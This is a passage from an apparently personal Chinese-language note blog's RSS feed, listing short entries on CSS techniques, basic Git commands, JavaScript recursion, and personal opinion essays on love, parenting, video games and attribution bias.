      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E6%AD%A3%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</guid>
      <description>正比例函数 解析式 $y = kx$（$k$ 为常数，$k$ ≠ $0$），其中 $k$ 叫做比例系数。</description>
    </item>
    
    <item>
      <title>同时推送到Gtihub和Gitee</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%8C%E6%97%B6%E6%8E%A8%E9%80%81%E5%88%B0gtihub%E5%92%8Cgitee/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%8C%E6%97%B6%E6%8E%A8%E9%80%81%E5%88%B0gtihub%E5%92%8Cgitee/</guid>
      <description>同时推送到 Gtihub 和 Gitee 修改 Git 的配置文件config
找到**[remote &amp;ldquo;origin&amp;rdquo;]下的url**
增加需要添加的远程库 url 即可</description>
    </item>
    
    <item>
      <title>如何学习历史</title>
      <link>https://note.yxzi.xyz/note/view/study/%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0%E5%8E%86%E5%8F%B2/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/study/%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0%E5%8E%86%E5%8F%B2/</guid>
      <description>如何学习历史 当你读一本历史书，读到书中的古人面临重要的抉择关头时，请你这时立刻把书合上。
好好想一想，如果你身处对方的位置时，
你会如何决定？
做什么样的决定？
把一切都想清楚后，再把书打开，看看这个人物是怎么做的，
他最后做了什么样的决定？
他的决定带来的是成功还是失败？
原因何在？
然后比较自己与古人，在选择和方法上有何异同之处？
这种学习历史的方法，所重视的不是记忆，而是思辨。</description>
    </item>
    
    <item>
      <title>安装 Git</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%AE%89%E8%A3%85-git/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%AE%89%E8%A3%85-git/</guid>
      <description>安装 Git 官网下载并安装 Git (git-scm.com)，下载完成后，默认选项安装即可。
安装完成后，右击后在菜单中选择 Git Bash ，蹦出一个类似命令行窗口的东西，就说明 Git 安装成功了！
Rainy@Rainy MINGW64 /e/Rainy 配置个人信息 因为 Git 是分布式版本控制系统，所以，每台设备都必须自报家门，也就是在命令行输入你的 Github 用户名和 Email 地址。
首先，找一个合适的文件夹，右击 Git Bash，在命令行输入
git config --global user name &amp;#34;Your Github UserName&amp;#34; git config --global user email &amp;#34;Your Github Email&amp;#34; 注意git config命令的--global参数，用了这个参数，表示你这台设备上所有的 Git 仓库都会使用这个配置，当然也可以对某个仓库指定不同的 UserName 和 Email 地址。</description>
    </item>
    
    <item>
      <title>递归</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%80%92%E5%BD%92/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%80%92%E5%BD%92/</guid>
      <description>递归 简单地说，就是如果在函数中存在着调用函数本身的情况，这种现象就叫递归。
从所需结果出发不断回溯前一运算直到回到初值再递推得到所需结果。从未知到已知，从大到小，再从小到大。
用计算阶乘函数举例，factorial()中存在着factorial(n - 1)的调用，所以此函数就是递归函数。
var n = 5; function factorial(n) { 	if (n == 1) { 	return 1; 	} 	return (n = n * factorial(n - 1)); } console.log(factorial(n)); 使用递归的思路   找规律（符合人的思维过程）。
  找出口（用已知的条件当做终止条件，用实际性的数去返回结果），避免无限递归（即无限循环），导致浏览器崩溃。
     递归的一般格式为 return + 有规律公式。      递归优缺点 优点
 使代码更加简洁。  缺点
 影响程序的效率与性能，因此，复杂的程序一定不要使用递归。  </description>
    </item>
    
    <item>
      <title>什么是爱情</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E4%BB%80%E4%B9%88%E6%98%AF%E7%88%B1%E6%83%85/</link>
      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E4%BB%80%E4%B9%88%E6%98%AF%E7%88%B1%E6%83%85/</guid>
      <description>什么是爱情 一 什么是爱情？你告诉我
什么是喜欢？你告诉我
什么是有趣的灵魂？
什么才能让你爱上我独一无二的灵魂？
是共性吗？是吸引吗？是魅力吗？
是相处时的点点滴滴吗？
是令人神魂颠倒的一见钟情吗？
是怜悯吗？是欺骗吗？是欲望吗？
一群没有爱人能力的巨婴，互相在说着爱与奉献一生一世？
谁知道啊？谁能挖出他的心来看一看？
一丝好感描述成喜欢
一点喜欢描绘成爱情
一点点荷尔蒙上头许下一生一世
这就是令人迷恋痴缠割舍不掉的爱情吗？
扪心自问你爱过谁？
父母？兄妹？死党？朋友？男神女神？
扪心自问你爱自己吗？
见人没几面，跟人没说过几句话，
看着人家阳光下明媚的微笑，晚风吹起鬓边的秀发，湿漉漉的眼睛装满了星辰大海，
就以为爱上了人家？
你知道 Ta 的梦想理想是什么吗？
你知道 Ta 的爱好是什么吗？
你知道 Ta 喜欢看什么书吗？
你知道 Ta 的精神世界与你契合吗？
你知道 Ta 抠脚放屁的时候吗？
你知道 Ta 刚起床乱蓬蓬的头发吗？
你知道 Ta 睡眼惺忪的眼屎吗？
你知道 Ta 塞牙抠鼻屎拉屎的情景吗？
或许在你的世界里，帅哥仙女是不会拉屎的吧。
二 你知道尊重是什么吗？
你能够不插嘴，听人家的高谈论阔吗？
你能够不指手画脚，尊重人家的爱好吗？
最起码的尊重有没有，还谈爱情？
不过是一群不会尊重他人的思想上的巨婴罢了。
三 看上了别人的肉体和颜值，
却信誓旦旦的说着：好看的皮囊千篇一律，有趣的灵魂万里挑一
爱情靠的是共性和吸引
共性和吸引
相同的三观
不同的爱好
否则当初那点吸引
早就在时间长河中消磨殆尽了</description>
    </item>
    
    <item>
      <title>杀一救百是否正义</title>
      <link>https://note.yxzi.xyz/note/view/society/%E6%9D%80%E4%B8%80%E6%95%91%E7%99%BE%E6%98%AF%E5%90%A6%E6%AD%A3%E4%B9%89/</link>
      <pubDate>Tue, 19 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E6%9D%80%E4%B8%80%E6%95%91%E7%99%BE%E6%98%AF%E5%90%A6%E6%AD%A3%E4%B9%89/</guid>
      <description>杀一救百是否正义 不正义
有一句话可以很好的回答这个问题：
你每个器官都能救一条人命，请。
杀一救百这种做法，表面上是维护了所谓更大的利益，但从更本质的层面，它摧毁了社会中每一个人的安全感。
如果这种行为被允许甚至被提倡，那么所有人——至少是大部分没有选择权的人，都会陷入恐惧：
你永远不知道自己什么时候会成为被牺牲的那个 1
而你对此将毫无还手之力。
这种恐惧，最终将不可避免地撕裂整个社会。</description>
    </item>
    
    <item>
      <title>提倡禁止游戏</title>
      <link>https://note.yxzi.xyz/note/view/society/%E6%8F%90%E5%80%A1%E7%A6%81%E6%AD%A2%E6%B8%B8%E6%88%8F/</link>
      <pubDate>Mon, 18 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E6%8F%90%E5%80%A1%E7%A6%81%E6%AD%A2%E6%B8%B8%E6%88%8F/</guid>
      <description>提倡禁止游戏 因为我不 xx，所以可以禁 xx 支持禁止游戏的人，都是不玩游戏的人。
我支持禁止抽烟，因为我不抽烟。
我支持禁止喝酒，因为我不喝酒
&amp;hellip;.
将教育的失败的责任推给游戏 孩子学习不好，父母没有和他一起找原因，而是骂你为什么不好好学习。
孩子学习努力取得不错的成绩，父母会抛开孩子的努力，却说自己带孩子带得好。
父母看别人家的孩子成绩优异，父母没有想自己孩子成绩不好是哪些因素导致的，而是骂自己的孩子：你为什么成绩不好。
父母看见孩子玩游戏，不知道对孩子引导游戏和生活的关系，而是在那骂游戏。
这种父母，真无能。
如果被称作第九艺术的游戏被禁，那前八艺术还有不禁的天理？一个优秀的游戏，能真正让一个人理解到很多东西。
降低犯罪率 大多数人，都活在生活的阳光面。
哪怕你自己仅仅是个大专生，你的学历也超越了一半的同龄人，那么剩下的另一半呢？
以前的学生，做的事情你根本想象不出来。
闲得无聊就打架，打了架就想拉帮结派的，拉帮结派后胆子大了，就敢拿刀了，
然后就有进派出所的，看场子的，放高利贷的。
而现在呢？下课了躺在空调房打游戏，不香吗？
我曾处理过一起约架事件，双方没打起来的原因是：
一方的两个兄弟在打晋级赛，小孩子的矛盾来得快去的么快，等晋级赛打完以后，矛盾已经消除了。
可笑却引人深思，这就是游戏即娱乐的作用。</description>
    </item>
    
    <item>
      <title>环境的影响</title>
      <link>https://note.yxzi.xyz/note/view/society/%E7%8E%AF%E5%A2%83%E7%9A%84%E5%BD%B1%E5%93%8D/</link>
      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E7%8E%AF%E5%A2%83%E7%9A%84%E5%BD%B1%E5%93%8D/</guid>
      <description>环境的影响 对大多数人而言，环境对人的影响都很大
环境影响的是人的三观，确切的说是影响人对于好、一般和坏的判断阈值。
当你你周围的人都是早上 10 点才起床的时候，你就会觉得 9 点起床很早了，
而如果你周围都是早上 7 点就起的，你就会觉得 8 点起就已经很晚了。
你没有必要也没有能力说服所有人都和你观点一样，而且你的观点也并不一定就是正确的，
所以你要接受有人观点和你不同这个客观事实
只和那些愿意和你交流，你也愿意和他交流的人交流，否则就是浪费时间
保持谦卑，注意反思，不断进步，
保持谦卑——永远记得你不是最牛的，只是你不知道有人比你牛而已
注意反思——时刻反问自己，你认为的就一定是对的么
不断进步——不要为自己的停滞不前找借口，你只是不想进步了而已
双标 为什么当别人抱怨一件事情的时候，我们总觉得问题出在他们自身？
然而，为什么当我们自己遇到不如意的时候，我们却觉得错的是他人或是环境？
这种现象叫做基本归因谬论，它普遍地存在于大多数人身上。
我们倾向于用内因解释他人的行为，而忽略环境的影响。
但是当我们尝试理解自身行为的时候，外因变得格外明显，
因此我们会过分强调环境的影响而忽视自身的因素——这就是所谓的行动者—观察者偏误。
Jones and Harris 在 1967 年做了一个实验。他们找了一群学生，
让学生们读一篇反对或是支持菲德尔卡斯特罗（古巴前领导人）的文章，然后评价文章作者对卡斯特罗的态度。
第一组学生被告知文章的作者是自由选择文章的立场，
这组学生很自然地认为支持卡斯特罗的文章作者对卡斯特罗的态度更正面。
第二组学生被告知文章作者的立场是由抛硬币决定的，换而言之，文章的立场与作者本人的态度无关。
遵循逻辑来说，这第二组的学生应该无法判断作者的态度，可是实验结果却显示，
学生们依旧认为由抛硬币决定撰写支持卡斯特罗立场的文章作者对卡斯特罗抱有更加正面的态度。
为什么会有这种现象？并不是因为我们都是自私爱推脱责任的坏人，只是我们的注意力有局限罢了。
当我们观察和分析他人的时候，我们的注意力集中在那个人身上，很容易会忽视周围的环境。
而当我们自己做一件事的时候，一定会有更多地注意力放在周围的环境上。
因此我们在给行为归因的时候，就倾向于选择我们注意力关注到的一方。
另外，我们在对待他人的事情上，是相当懒惰的。
由于我们的认知系统会自动地用内因解释他人的行为，
纵使我们意识到了他人行为受到环境的限制，我们的认知系统还需要清醒地商榷调整之前所做的解释。
尤其是在认知系统非常繁忙的情况下，我们没有足够的认知资源去为他人的行为辩解。
最后一个原因，或许有些人听说过——正义世界现象。
我们更愿意相信自己生存的世界是正义的、是我们能够掌控的，只要我们努力就能得到我们想要的。
如果我们把他人的失败归因于其自身，那么这个无法改变也无法控制的世界在我们眼中便还是好的、公正的。相信世界是好的，
失败都是因为他人自己的过错，这样的想法满足了我们内心底的安全感。
朋友抱怨的时候，请学会换位思考。
即使无法提供帮助，至少不要妄下定论。</description>
    </item>
    
    <item>
      <title>Css 实现居中</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%AE%9E%E7%8E%B0%E5%B1%85%E4%B8%AD/</guid>
      <description>实现居中 绝对定位 兼容性不错的主流 css 绝对定位居中的用法：
width: 600px; height: 400px; position: absolute; left: 50%; top: 50%; margin-top: -200px; /* 高度的一半 */ margin-left: -300px; /* 宽度的一半 */ 绝对定位 transform 中 translate 偏移的百分比值是相对于自身大小的，可以这样实现 css 绝对定位居中，给子元素应用以下样式，将子元素居于父元素正中间，注意：这个方法有 bug。
position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); 弹性布局 给父元素应用以下样式，将子元素居于父元素正中间。
display: flex; flex-direction: row; justify-content: center; align-items: center; display: flex; flex-direction: column; justify-content: center; align-items: center; 文本实现垂直居中 display: flex; align-items: center; </description>
    </item>
    
    <item>
      <title>Css 盒子类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E7%B1%BB%E5%9E%8B/</guid>
      <description>盒子类型 行盒   display 属性为 inline 的元素是行盒，也叫行级元素；如 span、strong、button、em、a、img、video、audio。
  文字一定是行盒（文字会产生匿名行盒将其包裹）。
  内部产生参考线：一个元素中包含行盒，通常会给行盒设置 vertical-align:baseline，这会导致两个元素的参考线对齐。
  同一个包含块中，连续多个行盒水平依次排列，剩余空间排列不下，才会换行。
  行盒不能包含块盒（a 元素除外）。
  设置 width 和 height 无效；调整行盒的 width 与 height 应使用字体大小、行高、字体类型等间接调整。
  产生空白合并：代码中的连续空白字符，在页面显示时，会被合并为一个空格。
  设置内外边距及边框，水平方向有效，垂直方向只会影响元素的背景，不会影响其他盒子。
  内部包含行块盒或可替换元素，行盒的高度只和文字内容的字体大小有关系，和行块盒或可替换元素无关。
  块盒  display 属性为 block 的元素，也叫块级元素；如 div、h1~h6、pre、ul、li、p。 同一个包含块中，每个块盒独占一行。 p 元素不能包含 div 元素。  行块盒  display 属性为 inline-block 的元素，也叫行块级元素；没有默认值为 inline-block 的元素。 同一个包含块中，连续的多个行块盒水平依次排列。 行块盒内部一定会产生参考线。 产生空白合并  </description>
    </item>
    
    <item>
      <title>Css 高斯模糊</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E9%AB%98%E6%96%AF%E6%A8%A1%E7%B3%8A/</guid>
      <description>高斯模糊 backdrop-filter: blur(0.5rem); </description>
    </item>
    
    <item>
      <title>国内无法访问外网的原因</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%E7%9A%84%E5%8E%9F%E5%9B%A0/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%E7%9A%84%E5%8E%9F%E5%9B%A0/</guid>
      <description>国内无法访问外网的原因 国内外网被屏蔽有很多种原因，比如政治因素、安全因经济因素等等。
比如国外的信息有些是被中国法律不允许观看的（黄色，暴力、政治），
但是这些信息在有些国家是可以合法存在的，因此中国就屏蔽了大部分国外知名网站。
另外，虽然外网被屏蔽了，但并不是不能上，而是需要添加一些翻墙的软件（VPN），
通过这些软件可以访问外网的信息，网上可以下载到这类软件，但大部分都需要付费（比如我现在使用的 Clash）
不过目前这玩意是不合法的，无法在网上光明正大的传播或讨论，毕竟中国政治问题很大。</description>
    </item>
    
    <item>
      <title>孩子本就该回报</title>
      <link>https://note.yxzi.xyz/note/view/society/%E5%AD%A9%E5%AD%90%E6%9C%AC%E5%B0%B1%E8%AF%A5%E5%9B%9E%E6%8A%A5/</link>
      <pubDate>Fri, 15 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E5%AD%A9%E5%AD%90%E6%9C%AC%E5%B0%B1%E8%AF%A5%E5%9B%9E%E6%8A%A5/</guid>
      <description>将孩子带大很辛苦，孩子本就该回报 这根本就是反自然的。基因延续是每个物种的义务，是物种最原始的追求和毕生唯一的意义，
人类也不例外。做什么不辛苦？跳支广场舞也要出满身的汗呢。相比于世间其它的事情，
传承是能够给人带来最大满足感的事情，这是大自然给予每个传承者的反馈。但是呢？
为什么有些人感觉不到快乐？因为他们拒绝传承，所以不快乐。
你辛苦的回报，早在你养育孩子的时候，大自然就给你回馈了，孩子给予你的快乐，是额外的。
若还妄想孩子给予你回报，这就是索要，索要都是要付出代价的，那些向孩子索要的父母，迟早会感受到大自然和孩子的恶意。</description>
    </item>
    
    <item>
      <title>父母与子女</title>
      <link>https://note.yxzi.xyz/note/view/society/%E7%88%B6%E6%AF%8D%E4%B8%8E%E5%AD%90%E5%A5%B3/</link>
      <pubDate>Fri, 15 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E7%88%B6%E6%AF%8D%E4%B8%8E%E5%AD%90%E5%A5%B3/</guid>
      <description>父母与子女 父母作为孩子在这个世界的引路人，本身对孩子就有着天然的义务——保护孩子避免过早暴露在危险中。
如果父母不能做到这一点，就是父母的失职，违背自然规律是会受到最原始的反噬的。
如果父母有能力做到这一点而拒绝去做，这就是父母的罪恶，必然会受到自然规律严重的惩罚。
父母没能力让孩子啃老是父母的问题，父母应该意识到他们自身的问题，不过这我也不想过于苛责。
我真正苛责的是那些有能力却只顾自己享乐，并且用“啃老可耻”绑架孩子的父母。
而正是这样的父母，造就了一批自私自利不能共情的孩子。
有的孩子一出生，就没很好的获得父母的资源，无论精神上还是物质上，
父母懒惰自私，自己享乐苦了孩子，一直持续到孩子长大。
等孩子长大，又用“辛苦把孩子拉扯大”来道徳绑架孩子来满足自己的私欲。
这样的父母，压根就没想过给孩子提供保护，更没想过让孩子啃，
往往也是这样的父母，才会将“啃老”二字挂在嘴上。
这就是我所说的，穷人才会啃老，穷人的孩子，占一点父母的便宜，就会被懒惰自私的穷父母说啃老。</description>
    </item>
    
    <item>
      <title>Css 字体</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%AD%97%E4%BD%93/</link>
      <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%AD%97%E4%BD%93/</guid>
      <description>字体 参考线 当制作文字时，会出现几根参考线。不同的文字类型，参考线位置、距离都不一样，同一种文字类型，参考线一致。
组成
 text_top ascent，顶线 super，上基线 baseline，基线 sub，下基线 text_bottom descent，底线  决定因素
 font-family：定义参考线的相对距离。 font-size：定义参考线之间的距离。 line-height：定义参考线的顶部空隙与底部空隙。  元素的基线 img：基线位置位于 img 的下外边距的最底边。
from：基线位于其内容的底边。
行块盒：父元素内部包含行块盒（高度自适应） ，会因为行块盒最后一行有 line-box，则会导致行块盒用最后一行的基线作为整个父元素的基线。若父元素中没有行盒，则使用父元素的下外边距作为基线。
font-size 用该属性设置字体大小时，改变的是文字的相对大小，也叫字体框大小。
制作文字时，文字外面会有一个字体框，不同的文字的字体框，大小也不一样；即设置文字的小大，本质改变的是文字的相对大小。
相对大小
若一个文字的相对大小（字体框大小）为 2048 时，那么它顶线到基线的距离为 1884，底线到基线的距离为 514，则顶线到底线的距离为 1884 + 514 = 2398。（可以拙见为一个字体的高为 2048，那么该字体占的实际区域是 2390，因此某些字体会有默认边距）
文字顶线到底线的距离，叫做文字的实际大小（content-area），也叫内容区。即行盒的背景，填充的是文字的实际大小。因此当我们给行盒设置背景时，会导致行盒上下有留白。即上部分留白 + 行盒背景 + 下部分留白 = 文字的相对大小。
line-height 用于设置多行元素的空间量。
top：文字顶线向上延申的空间。
bottom：文字底线向下延申的空间。
空隙  这两个空间（top 与 bottom）的空间量一定相等，这两个空间叫做空隙（line gap）。 通常，空隙是字体设计者决定的，因此有些字体没有空隙，但有的字体有空隙，有的字体空隙是负数。  虚拟区  top 到 botoom 的距离，叫做虚拟区（virtual-area），有的虚拟区和内容区相等，有的虚拟区比内容区小，但大部分虚拟区都比内容区大；因此设置行高大小就等于设置虚假区的大小。 因为虚拟区上下两边都相等，所以字体的实际大小在虚拟区之间。  line-box  line-box（行框）是承载文字内容的必要条件，如果没有行框，文字将无法显示。 当有多行行盒排列时，每一行的区域就叫做 line-box，line-box 的顶边是该行所有行盒的最顶边，底边是该行行盒的最低底边。即一个行盒的实际占用高度是通过 line-box 计算的。  不生成 line-box 的情况</description>
    </item>
    
    <item>
      <title>Git 删除文件</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/</guid>
      <description>删除文件 git rm FileName 命令git rm用于删除一个文件。
如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容
删错文件怎么办 有时候，你误删了一个文件 FileName，但因为版本库里还有，所以可以使用git checkout -- FileName把误删的文件恢复到最新版本
git checkout -- FileName </description>
    </item>
    
    <item>
      <title>Css 文本溢出处理</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</link>
      <pubDate>Wed, 13 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E5%A4%84%E7%90%86/</guid>
      <description>文本溢出处理 实现单行文本的溢出显示省略号可以直接用 text-overflow:ellipsis 属性来实现，当然还需要加宽度width属来兼容部分浏览。
overflow: hidden; text-overflow: ellipsis; white-space: nowrap; </description>
    </item>
    
    <item>
      <title>Css 渐变</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E6%B8%90%E5%8F%98/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E6%B8%90%E5%8F%98/</guid>
      <description>渐变 background-image: linear-gradient(rgb(48, 47, 47), rgb(177, 177, 175)); </description>
    </item>
    
    <item>
      <title>Css 自适应布局</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E8%87%AA%E9%80%82%E5%BA%94%E5%B8%83%E5%B1%80/</guid>
      <description>自适应布局 @media screen and (min-width: 720px) { 	/* 当浏览器宽度大于 value 时所应用的样式 */ }  @media screen and (max-width: value) { 	/* 当浏览器宽度小于 value 时所应用的样式*/ } </description>
    </item>
    
    <item>
      <title>Git git status</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-status/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-status/</guid>
      <description>git status 查看当前 git 的状态，即查看工作区代码相对于暂存区的差别。比如哪些文件还在工作区（还没git add）、哪些文件还在暂存区（还没git commit）等等，及时了解当前的 git 状态可以避免一些误操作。
但git status并不能让我们知道这些文件具体修改了什么内容。</description>
    </item>
    
    <item>
      <title>每个人眼中的世界都不一样</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E6%AF%8F%E4%B8%AA%E4%BA%BA%E7%9C%BC%E4%B8%AD%E7%9A%84%E4%B8%96%E7%95%8C%E9%83%BD%E4%B8%8D%E4%B8%80%E6%A0%B7/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E6%AF%8F%E4%B8%AA%E4%BA%BA%E7%9C%BC%E4%B8%AD%E7%9A%84%E4%B8%96%E7%95%8C%E9%83%BD%E4%B8%8D%E4%B8%80%E6%A0%B7/</guid>
      <description>每个人眼中的世界都不一样 说一个你们正常人一辈子不会有的体验，让你们感受下什么叫世界观崩塌。
我天生左眼失明，但我居然在 7 岁才发现这一点。
而之前无论我还是其他人都没意识到我有什么不正常。
你们知道这意味着多恐怖的事情吗？这件事彻底刷新了我的世界观！
因为&amp;quot;所有人没有意识到有什么不正常&amp;quot;本身就是最大的不正常。
这意味着我们各自认知到的世界有可能根本就是完全不同的，而我们却没有察觉到这一点。
我们虽然能“感觉”到同一个东西，但是这个东西在我们的认知中可能并不相同。
普通人可能以为这种认知差别最多也就是红绿色盲和普通人的差别。
而事实是这个差别可能大到人类无法想象的程度，而我们却意识不到。
比如我左眼什么都看不到，但因为天生就如此，所以就把这种设定当作理所当然的事情接受了，而没有感到任何不妥！
更进一步的说。
如果这种个体世界观的差异不影响这个世界逻辑自洽性。
那我们可能一辈子都生活在“人生而平等”的错觉中而没法发现，就像很多红绿色盲一辈子没意识到自己的认知有问题。
我们以为其他人认知中的世界和自己认知中的世界是一样的，然而事实是，如果我们不一样你也不一定意识得到。
而且即便我们意识到了我们各自的脑内世界不同，我们也没法沟通到底有哪里不同。
我在知乎上提问过“两只眼睛看世界是什么体验？”，然而你们的回答我都看不太懂。
我 7 岁以前一直以为我看到的世界就是你们看到的世界。
直到我 7 岁第一次测视力，别人突然告诉我：
你一直看到的认为理所当然的世界和别人看到的世界根本不是一回事。
还有比这更细思恐极的吗？</description>
    </item>
    
    <item>
      <title>Css table 空隙</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/table-%E7%A9%BA%E9%9A%99/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/table-%E7%A9%BA%E9%9A%99/</guid>
      <description>table 空隙 如果可能，边框会合并为一个单一的边框。会忽略 border-spacing 和 empty-cells 属性。
border-collapse: collapse; </description>
    </item>
    
    <item>
      <title>年纪轻轻思想深度就高于常人</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E5%B9%B4%E7%BA%AA%E8%BD%BB%E8%BD%BB%E6%80%9D%E6%83%B3%E6%B7%B1%E5%BA%A6%E5%B0%B1%E9%AB%98%E4%BA%8E%E5%B8%B8%E4%BA%BA/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E5%B9%B4%E7%BA%AA%E8%BD%BB%E8%BD%BB%E6%80%9D%E6%83%B3%E6%B7%B1%E5%BA%A6%E5%B0%B1%E9%AB%98%E4%BA%8E%E5%B8%B8%E4%BA%BA/</guid>
      <description>年纪轻轻思想深度就高于常人 我相信的确有这么一部分人，年纪轻轻却有着远超同龄人或者常人的思想跟经验，
但我觉得这不只是可以靠饱读诗书而获得，读书可以得到丰富的知识跟培养文学素养，
可如果真的说想让人变得成熟和获得思想深度，我更愿意相信的是：他们有着不同于同龄人或者常人的生活经历。
我记得现在大热电视剧《猎场》里面，胡歌饰演的郑秋冬因为刚刚出狱想给自己简历洗白所以造假冒充高材生铤而走险去参加面试，
虽然违背了职业道德甚至有违法嫌疑但是面试临场的应对自如，口才出色给面试官都营造了很好的第一印象。
其中有一幕是一个面试官问他说他刚刚讲说中用了一个形容词：牢房的叮咬感，
从而问他是不是有监狱生活，当时郑秋冬掩饰住了自己的紧张跟心虚，说没有体验过并问面试官为何这么问，
面试官说因为自己曾经在看守所呆过一夜，所以能真切感受到他所表达的这种感触。
当然，我们不能否认，有时候人们表达自己的看法并不一定要有同样的体验才有发言权，
只能说是拥有真切的感受才会使得流露出的情感更加具有感染力与说服力。</description>
    </item>
    
    <item>
      <title>Css 修改网页滚动条样式</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E4%BF%AE%E6%94%B9%E7%BD%91%E9%A1%B5%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F/</guid>
